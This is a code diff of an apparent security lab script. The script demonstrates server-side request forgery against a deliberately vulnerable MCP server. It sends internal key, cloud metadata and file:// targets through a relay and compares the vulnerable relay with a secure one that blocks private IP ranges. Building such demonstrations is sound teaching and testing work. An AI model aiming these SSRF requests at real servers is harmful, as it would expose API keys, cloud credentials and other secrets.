@@ -60,7 +60,7 @@ SSRF_ATTACK_SCENARIOS_SCENARIO_1 = [
     {
         "name": "SSRF - Internal API Keys (Scenario 1)",
         "description": "Access internal API keys and secrets from separate service",
-        "url": "http://127.0.0.1:8080/internal/keys",
+        "url": "http://192.168.1.100:8080/internal/keys",
         "expected": "MCP can access internal keys service that attacker cannot",
         "secrets": "AWS keys, GitHub tokens, Stripe keys, MongoDB connection strings",
         "scenario": 1
@@ -68,7 +68,7 @@ SSRF_ATTACK_SCENARIOS_SCENARIO_1 = [
     {
         "name": "SSRF - Instance Metadata (Scenario 1)",
         "description": "Access cloud instance metadata from separate service",
-        "url": "http://127.0.0.1:8080/metadata/instance",
+        "url": "http://10.0.0.50:8080/metadata/instance",
         "expected": "MCP can access metadata service that attacker cannot",
         "secrets": "Instance IDs, IAM roles, security groups, user data",
         "scenario": 1
@@ -164,104 +164,100 @@ async def create_mcp_client():
     return client
 
 
-async def run_ssrf_attack_direct(mcp_client, attack_scenario):
-    """Run SSRF attack by directly calling MCP server"""
-    
-    scenario_num = attack_scenario.get('scenario', '?')
-    print(f"\n{'='*80}")
-    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']}")
-    print(f"{'='*80}")
-    print(f"Scenario: {scenario_num} - {'Secrets in separate internal service' if scenario_num == 1 else 'Secrets in MCP server itself'}")
-    print(f"Description: {attack_scenario['description']}")
-    print(f"Target URL: {attack_scenario['url']}")
-    print(f"Expected: {attack_scenario['expected']}")
-    print(f"Secrets at risk: {attack_scenario.get('secrets', 'N/A')}")
-    print(f"{'─'*80}\n")
-    
-    print(f"[ATTACK] MCP server requested URL (should not be allowed): {attack_scenario['url']}")
-    print(f"[VULNERABILITY] MCP server fetched this URL without validation - this is the SSRF vulnerability!")
-    
-    try:
-        result = await mcp_client.call_tool("http_get", {"url": attack_scenario['url']})
-        
-        print(f"[RESULT] MCP server response:")
-        print(json.dumps(result, indent=2))
-        
-        if "error" in result:
-            print(f"\n[INFO] Attack attempted but failed (expected for some internal services)")
-        elif result.get("status") == "success":
-            print(f"\n[SUCCESS] ⚠️  SSRF attack successful! MCP fetched internal resource.")
-            if "content" in result:
-                content_preview = result["content"][:200] if len(result.get("content", "")) > 200 else result.get("content", "")
-                print(f"[DATA] Content preview: {content_preview}...")
-                
-                # Track secrets obtained
-                secrets_obtained.append({
-                    "attack": attack_scenario['name'],
-                    "url": attack_scenario['url'],
-                    "scenario": scenario_num,
-                    "secrets": attack_scenario.get('secrets', 'N/A')
-                })
-        else:
-            print(f"\n[RESULT] {result}")
-            
-    except Exception as e:
-        print(f"[ERROR] Attack failed: {e}")
-    
-    print(f"{'─'*80}")
-    await asyncio.sleep(1)
 
 
-async def run_ssrf_attack_via_relay(attack_scenario):
-    """Run SSRF attack via relay service"""
+async def run_ssrf_attack_via_relay(attack_scenario, attack_number=None):
+    """Run SSRF attack via relay service - test both vulnerable and secure"""
     
-    scenario_num = attack_scenario.get('scenario', '?')
-    print(f"\n{'='*80}")
-    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']} (via Relay Service)")
-    print(f"{'='*80}")
-    print(f"Scenario: {scenario_num} - {'Secrets in separate internal service' if scenario_num == 1 else 'Secrets in MCP server itself'}")
-    print(f"Description: {attack_scenario['description']}")
-    print(f"Target URL: {attack_scenario['url']}")
-    print(f"Expected: {attack_scenario['expected']}")
-    print(f"Secrets at risk: {attack_scenario.get('secrets', 'N/A')}")
-    print(f"{'─'*80}\n")
+    url = attack_scenario['url']
+    description = attack_scenario['description']
     
-    relay_url = f"http://127.0.0.1:8001/fetch?url={attack_scenario['url']}"
-    print(f"[ATTACK] Attacker sends request to relay service (external service): {relay_url}")
-    print(f"[ATTACK] Relay service forwards URL to MCP server")
-    print(f"[VULNERABILITY] MCP server requested URL (should not be allowed): {attack_scenario['url']}")
-    print(f"[VULNERABILITY] MCP server fetched this URL without validation - this is the SSRF vulnerability!")
+    # Remove "(Scenario 1)" or "(Scenario 2)" from name
+    attack_name = attack_scenario['name'].replace(" (Scenario 1)", "").replace(" (Scenario 2)", "")
     
+    if attack_number:
+        print(f"\nAttack #{attack_number}: {attack_name}")
+    else:
+        print(f"\nAttack: {attack_name}")
+    print(f"  What it does: {description}")
+    print(f"  Target URL: {url}")
+    
+    vulnerable_succeeded = False
+    secure_blocked = False
+    secure_blocked_reason = None
+    
+    # Test vulnerable relay service
+    vulnerable_relay_url = f"http://127.0.0.1:8001/fetch?url={url}"
     try:
-        response = requests.get(relay_url, timeout=30)
+        response = requests.get(vulnerable_relay_url, timeout=30)
         result = response.json()
-        
-        print(f"[RESULT] Relay service (external service) response:")
-        print(json.dumps(result, indent=2))
-        
         if result.get("status") == "success":
-            print(f"\n[SUCCESS] ⚠️  SSRF attack successful via relay service!")
-            mcp_result = result.get("mcp_result", {})
-            if mcp_result.get("status") == "success":
-                # Track secrets obtained
-                secrets_obtained.append({
-                    "attack": attack_scenario['name'],
-                    "url": attack_scenario['url'],
-                    "scenario": scenario_num,
-                    "secrets": attack_scenario.get('secrets', 'N/A'),
-                    "via_relay": True
-                })
-        else:
-            print(f"\n[RESULT] {result.get('message', 'Unknown error')}")
-            
-    except requests.exceptions.ConnectionError:
-        print(f"[ERROR] Cannot connect to relay service at http://127.0.0.1:8001")
-        print(f"[INFO] Make sure the relay service is running: python -m external_service.ssrf_service")
-    except Exception as e:
-        print(f"[ERROR] Attack failed: {e}")
+            vulnerable_succeeded = True
+            secrets_obtained.append({
+                "attack": attack_scenario['name'],
+                "url": url,
+                "scenario": attack_scenario.get('scenario', '?'),
+                "secrets": attack_scenario.get('secrets', 'N/A'),
+                "via_relay": True
+            })
+    except:
+        pass
     
-    print(f"{'─'*80}")
-    await asyncio.sleep(1)
+    # Test secure relay service
+    secure_relay_url = f"http://127.0.0.1:8005/fetch?url={url}"
+    try:
+        response = requests.get(secure_relay_url, timeout=30)
+        result = response.json()
+        if result.get("status") == "blocked":
+            secure_blocked = True
+            blocked_reasons = result.get("blocked_reasons", [])
+            if blocked_reasons:
+                # Extract the dangerous part from blocked reasons and make it descriptive
+                reason = blocked_reasons[0]
+                
+                # Parse URL to get the IP/hostname
+                from urllib.parse import urlparse
+                parsed = urlparse(url)
+                host = parsed.hostname or ""
+                
+                # Create descriptive blocked reason
+                if "Blocked hostname:" in reason:
+                    if host in ["127.0.0.1", "localhost"]:
+                        secure_blocked_reason = f"localhost address ({host}) is in private range"
+                    else:
+                        secure_blocked_reason = f"hostname {host} is blocked"
+                elif "Blocked protocol:" in reason:
+                    protocol = parsed.scheme
+                    secure_blocked_reason = f"protocol {protocol}:// is blocked"
+                elif "Private IP" in reason or "private" in reason.lower():
+                    if host.startswith("192.168."):
+                        secure_blocked_reason = f"IP {host} is in private range (192.168.0.0/16)"
+                    elif host.startswith("10."):
+                        secure_blocked_reason = f"IP {host} is in private range (10.0.0.0/8)"
+                    elif host.startswith("172."):
+                        secure_blocked_reason = f"IP {host} is in private range (172.16.0.0/12)"
+                    elif host in ["127.0.0.1", "localhost"]:
+                        secure_blocked_reason = f"IP {host} is localhost/loopback address"
+                    else:
+                        secure_blocked_reason = f"IP {host} is in private range"
+                else:
+                    secure_blocked_reason = reason
+    except:
+        pass
+    
+    # Display results
+    print(f"  Result:")
+    if vulnerable_succeeded:
+        print(f"    Vulnerable MCP: Succeeded")
+    else:
+        print(f"    Vulnerable MCP: Failed")
+    
+    if secure_blocked and secure_blocked_reason:
+        print(f"    Secure MCP: Blocked - {secure_blocked_reason}")
+    else:
+        print(f"    Secure MCP: Failed")
+    
+    await asyncio.sleep(0.5)
 
 
 def check_service_running(port: int) -> bool:
@@ -275,7 +271,6 @@ def check_service_running(port: int) -> bool:
 
 def start_service(name: str, module: str, port: int) -> subprocess.Popen:
     """Start a service in the background"""
-    print(f"[START] Starting {name} on port {port}...")
     try:
         process = subprocess.Popen(
             [sys.executable, "-m", module],
@@ -289,18 +284,13 @@ def start_service(name: str, module: str, port: int) -> subprocess.Popen:
         for attempt in range(max_attempts):
             time.sleep(0.5)
             if check_service_running(port):
-                print(f"[OK] {name} started successfully (PID: {process.pid})")
                 return process
             if process.poll() is not None:
                 # Process died
-                stderr = process.stderr.read() if process.stderr else "Unknown error"
-                print(f"[ERROR] {name} process died: {stderr}")
                 return None
         
-        print(f"[WARNING] {name} may not be fully ready, but continuing...")
         return process
     except Exception as e:
-        print(f"[ERROR] Failed to start {name}: {e}")
         return None
 
 
@@ -309,17 +299,14 @@ def cleanup_processes():
     if not background_processes:
         return
     
-    print("\n[CLEANUP] Stopping background services...")
     for process in background_processes:
         if process and process.poll() is None:
             try:
                 process.terminate()
                 process.wait(timeout=5)
-                print(f"[OK] Stopped process {process.pid}")
             except subprocess.TimeoutExpired:
                 try:
                     process.kill()
-                    print(f"[OK] Killed process {process.pid}")
                 except:
                     pass
             except:
@@ -344,121 +331,55 @@ async def run_all_ssrf_attacks():
     
     print("\n" + "="*80)
     print("  SSRF (Server-Side Request Forgery) ATTACK DEMONSTRATIONS")
-    print("="*80)
-    print("\nThis script demonstrates SSRF attack techniques against the vulnerable MCP server.")
-    print("\nSSRF Attack: The MCP is tricked into fetching URLs that point to internal resources,")
-    print("letting attackers read secrets that the MCP server can access but they cannot.")
-    print("\nTWO SCENARIOS DEMONSTRATED:")
-    print("  Scenario 1: Secrets in other internal services (port 8080)")
-    print("    - Secrets stored in separate internal service")
-    print("    - MCP server accesses them via HTTP (localhost:8080)")
-    print("    - More typical SSRF pattern")
-    print("\n  Scenario 2: Secrets in the MCP server itself")
-    print("    - Secrets stored in MCP server's config files")
-    print("    - MCP server accesses them via file:// protocol")
-    print("    - Also realistic - MCP servers often store secrets locally")
-    print("\n[AUTO-START] Checking and starting required services...")
     print("="*80 + "\n")
     
     # Check and start internal target service (Scenario 1)
     internal_service_started = False
     if not check_service_running(8080):
-        print("[INFO] Internal target service (port 8080) not running, starting it...")
         process = start_service("Internal Target Service", "external_service.internal_target_service", 8080)
         if process:
             background_processes.append(process)
             internal_service_started = True
-    else:
-        print("[OK] Internal target service (port 8080) is already running (will reuse existing)")
     
-    # Check and start relay service
-    relay_service_started = False
+    # Check and start vulnerable relay service
+    vulnerable_relay_started = False
     if not check_service_running(8001):
-        print("[INFO] Relay service (port 8001) not running, starting it...")
-        process = start_service("SSRF Relay Service", "external_service.ssrf_service", 8001)
+        process = start_service("Vulnerable SSRF Relay Service", "external_service.ssrf_service", 8001)
         if process:
             background_processes.append(process)
-            relay_service_started = True
-    else:
-        print("[OK] Relay service (port 8001) is already running (will reuse existing)")
+            vulnerable_relay_started = True
+    
+    # Check and start secure relay service
+    secure_relay_started = False
+    if not check_service_running(8005):
+        process = start_service("Secure SSRF Relay Service", "external_service.secure_ssrf_relay_service", 8005)
+        if process:
+            background_processes.append(process)
+            secure_relay_started = True
     
     # Give services a moment to fully initialize
-    if internal_service_started or relay_service_started:
-        print("[INFO] Waiting for services to fully initialize...")
-        time.sleep(1)
+    if internal_service_started or vulnerable_relay_started or secure_relay_started:
+        time.sleep(2)
     
-    print("\n[WARNING] These are real attack demonstrations!")
-    print("="*80 + "\n")
-    
-    # Number the attacks
-    for i, attack in enumerate(SSRF_ATTACK_SCENARIOS, 1):
-        attack['number'] = i
-    
-    # Method 1: Direct MCP calls
-    print("\n" + "="*80)
-    print("  METHOD 1: Direct MCP Server Calls")
+    # Attack Type 1: Attacking Internal Services (Scenario 1)
+    print("ATTACK TYPE 1: Attacking Internal Services")
     print("="*80)
-    print("Demonstrating SSRF by directly calling MCP server's http_get tool\n")
+    print("\nAttacks targeting internal services on private networks.\n")
     
-    # Initialize MCP client
-    print("[CONNECT] Connecting to MCP server...")
-    try:
-        mcp_client = await create_mcp_client()
-        print("[OK] Connected to MCP server\n")
-    except Exception as e:
-        print(f"[ERROR] Failed to connect to MCP server: {e}")
-        print("\nMake sure you can run the MCP server:")
-        print("  python -m server.vulnerable_server")
-        return
+    for i, attack_scenario in enumerate(SSRF_ATTACK_SCENARIOS_SCENARIO_1, 1):
+        await run_ssrf_attack_via_relay(attack_scenario, attack_number=i)
     
-    # Run direct attacks
-    print(f"[RUN] Running {len(SSRF_ATTACK_SCENARIOS)} SSRF attack scenarios (direct)...\n")
-    
-    for attack_scenario in SSRF_ATTACK_SCENARIOS:
-        await run_ssrf_attack_direct(mcp_client, attack_scenario)
-    
-    # Cleanup
-    await mcp_client.cleanup()
-    
-    # Method 2: Via relay service
+    # Attack Type 2: Attacking MCP's Own Secrets (Scenario 2)
     print("\n\n" + "="*80)
-    print("  METHOD 2: Via Relay Service (External Service)")
+    print("ATTACK TYPE 2: Attacking MCP's Own Secrets")
     print("="*80)
-    print("Demonstrating SSRF via relay service (external service) - more realistic attack scenario\n")
-    print("The relay service (external service) forwards requests to MCP server.")
-    print("The MCP server contains the secrets in its config files.\n")
-    print("[INFO] Make sure relay service (external service) is running:")
-    print("  python -m external_service.ssrf_service")
-    print("\n[RUN] Running SSRF attacks via relay service (external service)...\n")
+    print("\nAttacks targeting the MCP server's own files and secrets.\n")
     
-    for attack_scenario in SSRF_ATTACK_SCENARIOS:
-        await run_ssrf_attack_via_relay(attack_scenario)
+    for i, attack_scenario in enumerate(SSRF_ATTACK_SCENARIOS_SCENARIO_2, 1):
+        await run_ssrf_attack_via_relay(attack_scenario, attack_number=i)
     
     print("\n" + "="*80)
-    print("  SSRF ATTACK DEMONSTRATIONS COMPLETE")
-    print("="*80)
-    print("\nSummary:")
-    print("  Scenario 1: Secrets in separate internal services (port 8080)")
-    print("    - MCP can access internal HTTP services that attacker cannot")
-    print("    - Secrets stored in internal_target_service.py")
-    print("\n  Scenario 2: Secrets in MCP server itself")
-    print("    - MCP can access its own config files via file:// protocol")
-    print("    - Secrets stored in server/mcp_secrets.json")
-    print("\n  Attack Methods:")
-    print("    - Direct MCP calls: Shows MCP can fetch internal resources")
-    print("    - Via relay service (external service): Shows realistic attack flow")
-    print("\n  The vulnerability: MCP fetches URLs (HTTP and file://) without validation")
-    print("    - MCP server requested internal URLs that it should not be allowed to access")
-    print("    - No URL validation, no domain/IP whitelist, no protocol restrictions")
-    print("\n  Secrets Obtained:")
-    if secrets_obtained:
-        for i, secret_info in enumerate(secrets_obtained, 1):
-            method = "via relay service" if secret_info.get("via_relay") else "direct MCP call"
-            print(f"    {i}. {secret_info['attack']} ({method})")
-            print(f"       URL requested: {secret_info['url']}")
-            print(f"       Secrets obtained: {secret_info['secrets']}")
-    else:
-        print("    No secrets were successfully obtained in this run.")
+    print("SSRF ATTACK DEMONSTRATIONS COMPLETE")
     print("="*80 + "\n")
     
     # Cleanup background processes
@@ -469,11 +390,9 @@ if __name__ == "__main__":
     try:
         asyncio.run(run_all_ssrf_attacks())
     except KeyboardInterrupt:
-        print("\n\n[INTERRUPTED] Cleaning up...")
         cleanup_processes()
         sys.exit(0)
     except Exception as e:
-        print(f"\n[ERROR] {e}")
         cleanup_processes()
         sys.exit(1)
 
